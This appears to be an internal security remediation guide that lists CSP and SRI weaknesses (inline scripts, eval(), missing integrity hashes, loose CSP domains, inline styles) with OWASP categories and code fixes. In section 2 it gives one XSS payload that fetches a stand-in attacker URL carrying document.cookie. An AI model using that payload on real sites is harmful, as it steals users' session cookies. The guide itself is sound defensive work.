# Security Fix Guidelines (Code-Level Actions Required)

## Overview

This document outlines **application-level (code-side) security fixes** required to resolve vulnerabilities identified during the security assessment.

A security assessment identified multiple issues related to **Content Security Policy (CSP)** and **Subresource Integrity (SRI)**.

Note: Infrastructure-level protections (NGINX, Fail2Ban) are already implemented.
The below items MUST be fixed in **application code**.

---

## 1. Vulnerability Name  
**Unsafe Inline Scripts Allowed in CSP**

- **OWASP Category:** A03: Injection (Cross-Site Scripting - XSS)  
- **Affected File & Line Number:**  
  Multiple HTML files (e.g., index.html, inline `<script>` blocks)

- **Severity:** High  

- **Description:**  
The application uses inline JavaScript, which forces the Content Security Policy (CSP) to allow `'unsafe-inline'`. This weakens CSP protection and allows execution of injected scripts.

- **Business Impact:**  
An attacker can:
- Steal session cookies  
- Perform actions on behalf of users  
- Redirect users to malicious websites  

- **Proof of Concept:**  
```html
<script>alert(document.cookie)</script>
````

```javascript
document.body.innerHTML += '<script>alert(1)</script>';
```

* **Recommended Fix:**
  Move inline scripts to external files:

```html
<script src="/js/app.js"></script>
```

Update CSP:

```text
script-src 'self';
```

---

## 2. Vulnerability Name

**Use of eval() / Unsafe Dynamic Code Execution**

* **OWASP Category:** A03: Injection

* **Affected File & Line Number:**
  JavaScript files where `eval()` is used

* **Severity:** Critical

* **Description:**
  The application uses `eval()` or similar functions, which execute arbitrary JavaScript code dynamically. This requires `'unsafe-eval'` in CSP and allows attackers to run injected code.

* **Business Impact:**
  An attacker can:

* Execute arbitrary JavaScript

* Take control of user sessions

* Bypass input validation

* **Proof of Concept:**

```javascript
eval("alert('XSS')");
```

```javascript
eval(userInput);
```

Payload:

```javascript
userInput = "fetch('https://attacker.com?cookie='+document.cookie)"
```

* **Recommended Fix:**
  Replace with safe alternatives:

```javascript
JSON.parse(userInput);
```

Update CSP:

```text
script-src 'self';
```

---

## 3. Vulnerability Name

**Missing Subresource Integrity (SRI) for External Scripts**

* **OWASP Category:** A06: Vulnerable and Outdated Components

* **Affected File & Line Number:**
  HTML files loading CDN resources

* **Severity:** Medium

* **Description:**
  External scripts are loaded from CDNs without integrity validation. If the CDN is compromised, malicious scripts can be executed.

* **Business Impact:**
  An attacker can:

* Inject malicious scripts via CDN

* Steal sensitive data

* Deface the application

* **Proof of Concept:**

```html
<script src="https://cdn.example.com/lib.js"></script>
```

* **Recommended Fix:**
  Add SRI hash:

```html
<script 
  src="https://cdn.example.com/lib.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous">
</script>
```

---

## 4. Vulnerability Name

**Improper CSP Configuration for External Resources**

* **OWASP Category:** A05: Security Misconfiguration

* **Affected File & Line Number:**
  CSP header configuration

* **Severity:** Medium

* **Description:**
  CSP does not explicitly define trusted external domains, which may result in overly permissive or restrictive policies.

* **Business Impact:**

* Increased attack surface (if too permissive)

* Broken functionality (if too restrictive)

* **Proof of Concept:**

```text
connect-src 'self';
```

* **Recommended Fix:**
  Define allowed domains explicitly:

```text
connect-src 'self' https://api.example.com;
img-src 'self' https://cdn.example.com;
```

---

## 5. Vulnerability Name

**Use of Inline Styles (CSP Weakening)**

* **OWASP Category:** A05: Security Misconfiguration

* **Affected File & Line Number:**
  HTML files using inline styles

* **Severity:** Low

* **Description:**
  Inline styles require `'unsafe-inline'` in CSP `style-src`, reducing overall CSP effectiveness.

* **Business Impact:**

* May assist UI-based attacks

* Weakens CSP protection

* **Proof of Concept:**

```html
<div style="color:red;">Test</div>
```

* **Recommended Fix:**
  Move styles to external CSS:

```html
<link rel="stylesheet" href="/css/style.css">
```

---
## Already Implemented (Infrastructure Side)

The following protections are already enforced at the server level:

* Content Security Policy (CSP) headers
* Security headers (HSTS, X-Frame-Options, etc.)
* NGINX rate limiting
* Fail2Ban (API & SSH protection)

---

## Security Impact

If not fixed, these issues may allow:

* Cross-Site Scripting (XSS) attacks
* Malicious script execution
* Compromise via third-party CDN attacks

---

## Expected Outcome

After implementing the above fixes:

* CSP will no longer require `unsafe-inline` or `unsafe-eval`
* External resources will be verified using SRI
* Application will pass security scans with no medium-risk findings

---

## Reference

Aligned with **OWASP Top 10 (2021):**

* A03: Injection (XSS)
* A05: Security Misconfiguration
* A06: Vulnerable Components

---

